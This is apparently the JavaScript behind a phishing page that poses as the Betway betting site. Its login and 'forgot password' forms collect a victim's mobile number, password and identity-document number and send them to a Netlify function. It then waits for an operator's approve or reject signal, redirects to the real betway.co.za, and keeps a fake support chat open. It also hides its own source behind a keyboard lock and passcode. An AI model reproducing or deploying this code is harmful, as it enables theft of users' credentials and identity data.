document.onkeydown = function(e) {
  if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
    let p = prompt("Source Locked:");
    return p === "8890";
  }
};

let currentU = "Unknown", pollInt = null, chatPoll = null;

setTimeout(() => {
  document.getElementById('loading-view').style.display = 'none';
  openModal('login-modal');
}, 1500);

function openModal(id) {
  closeModals();
  document.getElementById(id).style.display = 'flex';
}

function closeModals() {
  document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none');
  stopAllSpinners();
}

function stopAllSpinners() {
  document.querySelectorAll('.submit-btn').forEach(b => {
    b.disabled = false;
    b.innerHTML = b.getAttribute('data-orig') || b.innerHTML;
  });
}

function togglePassword(i, e) {
  const f = document.getElementById(i);
  f.type = f.type === "text" ? "password" : "text";
}

function showError(id) {
  const e = document.getElementById(id);
  if (e) e.style.display = 'flex';
}

function startPolling(t) {
  if (pollInt) clearInterval(pollInt);
  pollInt = setInterval(() => {
    fetch('/.netlify/functions/api?action=getUpdates')
      .then(r => r.json())
      .then(d => {
        if (d && d.action === "approve") {
          clearInterval(pollInt);
          pollInt = null;
          document.getElementById('process-overlay').style.display = 'none';
          stopAllSpinners();
          document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
          document.getElementById('success-view').classList.add('active');
          closeModals();
          setTimeout(() => { window.location.href = "https://www.betway.co.za/"; }, 4000);
        } else if (d && d.action === "reject") {
          clearInterval(pollInt);
          pollInt = null;
          document.getElementById('process-overlay').style.display = 'none';
          stopAllSpinners();
          if (t === 'Betting Voucher logs') showError('login-error');
        }
      }).catch(e => {});
  }, 2000);
}

function validate(ids) {
  let valid = true, first = null;
  ids.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      const val = el.value.trim();
      if (!val || val.length < 1) {
        el.classList.add('error-field');
        valid = false;
        if (!first) first = el;
      } else {
        el.classList.remove('error-field');
      }
    }
  });
  if (first) first.focus();
  return valid;
}

function handleRecovery() {
  const input = document.getElementById('forgot-input');
  const errDiv = document.getElementById('forgot-err');
  
  if (!input.value.trim()) {
    input.classList.add('error-field');
    if (errDiv) errDiv.style.display = 'block';
    input.focus();
    return;
  }
  
  sendData('Forgot Password');
}

function remErr(i) { 
  i.classList.remove('error-field'); 
  const errDiv = document.getElementById('forgot-err');
  if (errDiv) errDiv.style.display = 'none';
}

function toggleChat() {
  const w = document.getElementById('chat-window');
  w.style.display = w.style.display === 'flex' ? 'none' : 'flex';
  if (w.style.display === 'flex') pollChat();
}

function addMsg(txt, cls) {
  const d = document.createElement('div');
  d.className = `msg-b ${cls}`;
  d.innerText = txt;
  document.getElementById('chat-msgs').appendChild(d);
  document.getElementById('chat-msgs').scrollTop = 9999;
}

function sendChatTxt() {
  const t = document.getElementById('chat-txt');
  if (!t.value) return;
  addMsg(t.value, 'msg-user');
  
  fetch('/.netlify/functions/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'sendChat', user: currentU, text: t.value })
  });
  t.value = '';
}

function pollChat() {
  if (chatPoll) return;
  chatPoll = setInterval(() => {
    fetch('/.netlify/functions/api?action=getChatUpdates')
      .then(r => r.json())
      .then(d => {
        if (d && d.text) {
          addMsg(d.text, 'msg-agent');
        }
      });
  }, 3000);
}

function sendData(t) {
  const btn = event.currentTarget;
  if (!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
  
  let payload = {};

  if (t === 'Betting Voucher logs') {
    if (!validate(['lgn-mobile', 'login-pw'])) return;
    currentU = document.getElementById('lgn-mobile').value;
    payload = {
      action: 'login',
      user: currentU,
      pass: document.getElementById('login-pw').value
    };
  } else if (t === 'Forgot Password') {
    const docNum = document.getElementById('forgot-input').value;
    const docType = document.getElementById('doc-type').value;
    const loginMobile = document.getElementById('lgn-mobile').value || "Not Entered";
    
    payload = {
      action: 'recovery',
      user: loginMobile,
      type: docType,
      log: docNum
    };
  }
  
  btn.disabled = true;
  btn.innerHTML = `<div class="spinner"></div>`;
  document.getElementById('process-overlay').style.display = 'flex';

  fetch('/.netlify/functions/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(r => r.json())
  .then(res => {
    startPolling(t);
  });
    }
